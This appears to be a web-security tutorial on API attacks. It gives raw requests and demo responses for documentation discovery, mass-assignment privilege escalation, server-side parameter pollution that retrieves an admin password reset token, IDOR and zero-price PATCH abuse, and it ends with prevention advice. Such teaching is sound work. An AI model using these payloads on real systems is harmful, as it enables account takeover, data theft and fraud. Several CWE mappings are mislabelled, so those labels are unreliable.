#  API Testing & Server-Side Vulnerabilities

**Category**: Client-Side Application Logic and Service Configurations  
**Severity Focus**: High to Critical (Potential for Account Takeover, Data Breach, Admin Access)  
**CWE Mapping**: CWE-20 (Primary), CWE-862, CWE-1357, CWE-918  
**OWASP API Top 10 2023**: API1:2023 (Broken Object Level Authorization), API2:2023 (Broken Authentication), API8:2023 (Security Misconfiguration)

---

## 1. API Reconnaissance & Discovery

### Module 01: API Documentation Discovery
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
APIs are typically documented for developers using human-readable (HTML, Markdown) or machine-readable (JSON, YAML, OpenAPI/Swagger) formats. Attackers exploit publicly exposed documentation to discover endpoints, parameters, HTTP methods, and request/response schemas that may not be used by the front-end.

Human-readable docs provide explanations and examples. Machine-readable docs (OpenAPI/Swagger) enable automated tools to parse and test endpoints. Even if not publicly available, documentation may be discoverable by crawling applications using the API.

Common documentation endpoints:
- `/api`
- `/swagger/index.html`
- `/openapi.json`
- `/api/swagger/v1`
- `/v1/api-docs`

#### Raw Discovery Request
```text
GET /swagger/index.html HTTP/1.1
Host: vulnerable-app.com
```

#### Demo Server Response (Interactive Swagger Docs)
```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Swagger API Documentation</title></head>
<body>
  <!-- Interactive API documentation with endpoints -->
  <div id="swagger-ui"></div>
  <script src="/swagger-ui-bundle.js"></script>
</body>
</html>
```
*   **Result**: Interactive documentation reveals all API endpoints, parameters, methods ✓

#### Attacker Documentation Discovery Script
```python
import requests

documentation_paths = [
    '/swagger/index.html',
    '/openapi.json',
    '/api',
    '/api/swagger/v1',
    '/v1/api-docs',
    '/api-docs'
]

for path in documentation_paths:
    response = requests.get(f'https://vulnerable-app.com{path}')
    
    if response.status_code == 200:
        print(f"[+] Documentation found at: {path}")
        print(f"Response: {response.text[:200]}")
```

---

### Module 02: API Endpoint Identification via JavaScript Analysis
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
JavaScript files often contain hardcoded API endpoint references that are not triggered via normal browser navigation. These hidden endpoints may expose admin functionality, internal APIs, or undocumented features.

Tools like JS Link Finder BApp automatically extract API endpoints from JavaScript files. Manual review of JS files can reveal endpoints like `/api/admin/users`, `/api/internal/v1/`, etc.

#### 🎯 Raw JavaScript File Request
```text
GET /static/js/forgotPassword.js HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (API Endpoint in JS)
```javascript
// /static/js/forgotPassword.js

function triggerPasswordReset(username) {
  fetch('/forgot-password', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username })
  });
}

// API endpoint: POST /forgot-password
// Parameter: username (string)
```
*   **Result**: Hidden API endpoint discovered in JavaScript file ✓

---

### Module 03: HTTP Method Testing (OPTIONS, PATCH, DELETE)
*   **CWE Mapping**: CWE-693 (Protection Mechanism Failure)
*   **OWASP API Top 10 Reference**: API1:2023-Broken Object Level Authorization

#### Low-Level Architectural Mechanics
API endpoints may support different HTTP methods beyond GET/POST. Testing all methods (GET, POST, PUT, PATCH, DELETE, OPTIONS) can reveal:
- **OPTIONS**: Returns allowed methods (e.g., GET, PATCH)
- **PATCH**: May update resources (often requires auth)
- **DELETE**: May remove resources (often admin-only)

An endpoint like `/api/tasks` might support:
- `GET /api/tasks` → List tasks
- `POST /api/tasks` → Create task
- `DELETE /api/tasks/1` → Delete task

#### 🎯 Raw HTTP Method Testing (OPTIONS)
```text
OPTIONS /api/products/3/price HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (Allowed Methods)
```http
HTTP/1.1 200 OK
Allow: GET, PATCH

```
*   **Result**: Endpoint supports GET and PATCH methods, PATCH may be exploitable ✓

#### 🎯 Raw Method Testing (PATCH)
```text
PATCH /api/products/1/price HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "price": 0
}
```

#### 📄 Demo Server Response (Price Modified)
```http
HTTP/1.1 200 OK

```
*   **Result**: Price successfully changed to $0, product can be bought for free ✓

---

### Module 04: Content-Type Testing (JSON vs XML)
*   **CWE Mapping**: CWE-20 (Improper Input Validation)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
APIs may behave differently based on content type. Changing `Content-Type` from `application/json` to `application/xml` can:
- Trigger errors disclosing information
- Bypass flawed defenses (XML may process differently)
- Enable injection attacks (XML vulnerable to XXE, JSON to SQLi)

#### 🎯 Raw Content-Type Change
```text
PATCH /api/products/1/price HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/xml  # ← Changed from JSON

<price>0</price>
```

#### 📄 Demo Server Response (Different Processing)
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "error": "Invalid content type. Expected application/json"
}
```
*   **Result**: Error reveals expected content type, may indicate security difference ✓

---

### Module 05: Hidden Endpoint Discovery via Intruder
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
After identifying one endpoint (e.g., `/api/user/update`), use Burp Intruder to guess similar endpoints by replacing path segments with common functions:
- `/api/user/delete`
- `/api/user/add`
- `/api/user/list`
- `/api/admin/users`

Wordlists based on API naming conventions (CRUD operations: create, read, update, delete) help discover hidden endpoints.

#### 🎯 Raw Intruder Payload Position
```text
PUT /api/user/§update§ HTTP/1.1
Host: vulnerable-app.com

Payload list: [update, delete, add, list, get]
```

#### 📄 Demo Server Response (Hidden Endpoint Found)
```http
HTTP/1.1 200 OK

{
  "message": "User deleted successfully"
}
```
*   **Result**: Hidden `/api/user/delete` endpoint discovered and exploited ✓

---

## 🔬 2. Mass Assignment Vulnerabilities

### Module 06: Mass Assignment (Auto-Binding)
*   **CWE Mapping**: CWE-862 (Missing Authorization)
*   **OWASP API Top 10 Reference**: API1:2023-Broken Object Level Authorization

#### Low-Level Architectural Mechanics
Mass assignment (auto-binding) occurs when frameworks automatically bind request parameters to object fields without validation. This creates hidden parameters from object fields that developers never intended to be user-modifiable.

Example:
- GET `/api/users/123` returns: `{ "id": 123, "name": "John", "email": "john@example.com", "isAdmin": false }`
- PATCH `/api/users` accepts: `{ "username": "wiener", "email": "wiener@example.com" }`

The `id` and `isAdmin` fields appear in GET response but not in PATCH request → hidden parameters via mass assignment.

Attacker adds `isAdmin: true` to PATCH request:
```json
{
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": true  // ← HIDDEN PARAMETER VIA MASS ASSIGNMENT
}
```

#### 🎯 Raw Mass Assignment Injection
```text
PATCH /api/users HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "wiener",
  "email": "wiener@example.com",
  "isAdmin": true
}
```

#### 📄 Demo Server Response (Admin Privilege Granted)
```http
HTTP/1.1 200 OK

{
  "message": "User updated successfully",
  "user": {
    "id": 456,
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true  // ← Admin privilege granted!
  }
}
```
*   **Result**: User granted admin privileges via mass assignment, admin functionality accessible ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Allowlist Properties)
def update_user(user_id, request_data):
    # Only allow these properties to be updated
    allowed_properties = ['username', 'email']
    
    # Block sensitive properties
    blocked_properties = ['id', 'isAdmin', 'password']
    
    # Filter request data
    filtered_data = {}
    for key, value in request_data.items():
        if key in allowed_properties and key not in blocked_properties:
            filtered_data[key] = value
    
    db.update_user(user_id, filtered_data)
    return "User updated"
```

---

## 🔬 3. Server-Side Parameter Pollution (SSPP)

### Module 07: SSPP in Query String (%26, %23)
*   **CWE Mapping**: C WW-20 (Improper Input Validation)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
Server-Side Parameter Pollution occurs when user input is included in server-side URL construction without proper escaping. Attackers inject URL-encoded characters to:
- `%26` = `&` → Add new parameter
- `%23` = `#` → Truncate query string (fragment)

Example:
username=administrator%26x=y
Server interprets as: `username=administrator&x=y` → Two parameters instead of one

#### 🎯 Raw SSPP Injection
```text
POST /forgot-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "administrator%26x=y"  // ← Injected &
}
```

#### 📄 Demo Server Response (Parameter Interpretation)
```http
HTTP/1.1 400 Bad Request

{
  "error": "Parameter is not supported: x"
}
```
*   **Result**: Server interpreted `&x=y` as separate parameter, SSPP confirmed ✓

#### 🎯 Raw Query String Truncation
```text
POST /forgot-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "administrator%23"  // ← Injected # to truncate
}
```

#### 📄 Demo Server Response (Truncation Detected)
```http
HTTP/1.1 400 Bad Request

{
  "error": "Field not specified"
}
```
*   **Result**: Query string truncated by `#`, server expects `field` parameter ✓

#### 🎯 Raw SSPP with Field Injection
```text
POST /forgot-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "administrator%26field=email%23"  // ← Injected &field=email#
}
```

#### 📄 Demo Server Response (Valid Field Found)
```http
HTTP/1.1 200 OK

{
  "email": "admin@example.com"  // ← Email returned for administrator!
}
```
*   **Result**: Injected `field=email` parameter accepted, email retrieved ✓

#### Complete SSPP Exploit (Password Reset Token)
```text
POST /forgot-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "administrator%26field=passwordResetToken%23"
}
```

#### 📄 Demo Server Response (Token Returned)
```http
HTTP/1.1 200 OK

{
  "passwordResetToken": "123456789"
}
```
*   **Result**: Password reset token for administrator obtained via SSPP, account takeover ✓

---

### Module 08: SSPP in REST URL (Path Traversal)
*   **CWE Mapping**: CWE-425 (Directory Traversal)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
SSPP occurs when user input is placed in URL path without escaping. Path traversal (`../`) and truncation characters (`%23`, `%3F`) can navigate to internal APIs or inject parameters.

Example:
username=administrator/field/foo%23

Server interprets path as: `/api/v1/users/administrator/field/foo` → Injected `field` parameter

#### 🎯 Raw Path Traversal Injection
```text
POST /forgot-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "administrator/field/foo%23"  // ← Injected /field/foo#
}
```

#### 📄 Demo Server Response (Invalid Field)
```http
HTTP/1.1 400 Bad Request

{
  "error": "API only supports email field"
}
```
*   **Result**: Server recognizes injected `field` parameter, only `email` valid ✓

#### 🎯 Raw Path Navigation to Internal API
```text
POST /forgot-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "../../v1/users/administrator/field/passwordResetToken%23"
}
```

#### 📄 Demo Server Response (Token from Internal API)
```http
HTTP/1.1 200 OK

{
  "passwordResetToken": "123456789"
}
```
*   **Result**: Navigated to internal API via `../../`, token obtained, account takeover ✓

---

## 🔬 4. API Authentication & Authorization

### Module 09: Broken Object Level Authorization (BOLA/IDOR)
*   **CWE Mapping**: CWE-287 (Improper Authentication)
*   **OWASP API Top 10 Reference**: API1:2023-Broken Object Level Authorization

#### Low-Level Architectural Mechanics
BOLA (also IDOR) occurs when API doesn't validate if user has permission to access specific object. Attacker changes object ID in request to access other users' data.

Example:
- `GET /api/orders/123` → Returns order 123 (attacker's)
- `GET /api/orders/124` → Returns order 124 (victim's) ← No authorization check!

#### 🎯 Raw BOLA Injection
```text
GET /api/orders/124 HTTP/1.1
Host: vulnerable-app.com
Authorization: Bearer attacker_token
```

#### 📄 Demo Server Response (Victim's Order)
```http
HTTP/1.1 200 OK

{
  "order_id": 124,
  "user": "victim",
  "total": 500,
  "items": ["laptop", "phone"]
}
```
*   **Result**: Access to victim's order without authorization, data breach ✓

---

### Module 10: Unused API Endpoint Exploitation
*   **CWE Mapping**: CWE-798 (Use of Hard-coded Credentials)
*   **OWASP API Top 10 Reference**: API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
APIs may have endpoints not used by front-end that expose sensitive functionality. These unused endpoints often lack proper authentication or have weaker security.

Example: `/api/products/1/price` (PATCH) modifies product price but not used in UI → exploitable.

#### 🎯 Raw Unused Endpoint Exploitation
```text
PATCH /api/products/1/price HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "price": 0
}
```

#### 📄 Demo Server Response (Price Modified)
```http
HTTP/1.1 200 OK

```
*   **Result**: Product price changed to $0, bought for free via unused endpoint ✓

---

## 🔧 Detection & Exploitation Methodology

### Step 1: API Recon
**Techniques**:
1. **Documentation discovery**: `/swagger`, `/openapi.json`, `/api`
2. **JavaScript analysis**: JS Link Finder BApp, manual review
3. **HTTP method testing**: OPTIONS, PATCH, DELETE
4. **Content-type testing**: JSON vs XML
5. **Hidden endpoints**: Intruder with wordlists

**Tools**: Burp Scanner, Burp Repeater, JS Link Finder, Intruder

### Step 2: Mass Assignment Testing
**Techniques**:
1. **GET response analysis**: Examine object fields
2. **PATCH request modification**: Add hidden fields
3. **Invalid value testing**: Send `isAdmin: "foo"` to confirm processing
4. **Privilege escalation**: Set `isAdmin: true`

**Tools**: Burp Repeater, Param Miner

### Step 3: SSPP Testing
**Techniques**:
1. **Query string injection**: `%26` (= `&`), `%23` (= `#`)
2. **Path traversal**: `../` to navigate to internal APIs
3. **Parameter injection**: `field=xxx`
4. **Field brute-force**: Server-side variable names list

**Tools**: Burp Repeater, Intruder (Server-side variable names)

### Step 4: BOLA/IDOR Testing
**Techniques**:
1. **ID enumeration**: Change `123` to `124`, `125`
2. **Authorization bypass**: Access victim's resources
3. **Horizontal/vertical**: Test same/different user levels

---

## 🛡️ Prevention Strategies

### Secure API Documentation
1. **Secure documentation** if not publicly accessible
2. **Keep documentation updated** for visibility
3. **Remove sensitive endpoints** from public docs

### Secure HTTP Methods
1. **Allowlist permitted methods** (GET, POST only)
2. **Block dangerous methods** (DELETE, PATCH)
3. **Validate method on each endpoint**

### Secure Mass Assignment
1. **Allowlist properties** user can update
2. **Blocklist sensitive properties** (`isAdmin`, `id`, `password`)
3. **Explicit field mapping** (not auto-binding)

### Secure SSPP Prevention
1. **Escape user input** in URL construction
2. **Validate input format** (no `&`, `#`, `/`)
3. **Use parameterized queries** (not string concatenation)

### Secure BOLA/IDOR Prevention
1. **Validate object ownership** on each request
2. **Check user permissions** before accessing object
3. **Use randomized IDs** (UUIDs, not sequential)

---

## 🎯 Key Takeaways

### When to Hunt for API Vulnerabilities
- Public API documentation (`/swagger`, `/openapi.json`)
- Unused endpoints not in front-end
- Different HTTP methods (OPTIONS, PATCH, DELETE)
- JSON/XML content-type differences
- Object fields in GET responses → test in PATCH
- User input in URL paths (SSPP opportunity)
- Object IDs in requests (BOLA/IDOR opportunity)

### Best Tools
- **Burp Scanner**: Crawl API, audit OpenAPI docs
- **Burp Repeater**: Manual endpoint testing
- **Burp Intruder**: Hidden endpoints, parameter brute-force
- **JS Link Finder BApp**: Extract endpoints from JS
- **Param Miner BApp**: Guess hidden parameters (65K per request)
- **Content type converter BApp**: JSON ↔ XML conversion

### Critical Concepts
- **Mass assignment**: Auto-binding creates hidden parameters
- **SSPP**: User input in URL without escaping
- **BOLA/IDOR**: No object ownership validation
- **Unused endpoints**: Backdoor functionality
- **HTTP methods**: Different methods = different functionality
- **Content types**: JSON vs XML processing differences

---

## 📚 References & Whitepapers

- **OWASP API Top 10 2023**: [API Security Top 10](https://portswigger.net/web-security/api-testing/top-10-api-vulnerabilities)
- **Burp OpenAPI Parser**: [OpenAPI Parser BApp](https://portswigger.net/bappstore/6bf7574b632847faaaa4eb5e42f1757c)
- **JS Link Finder**: [JS Link Finder BApp](https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf)
- **Param Miner**: [Param Miner BApp](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)
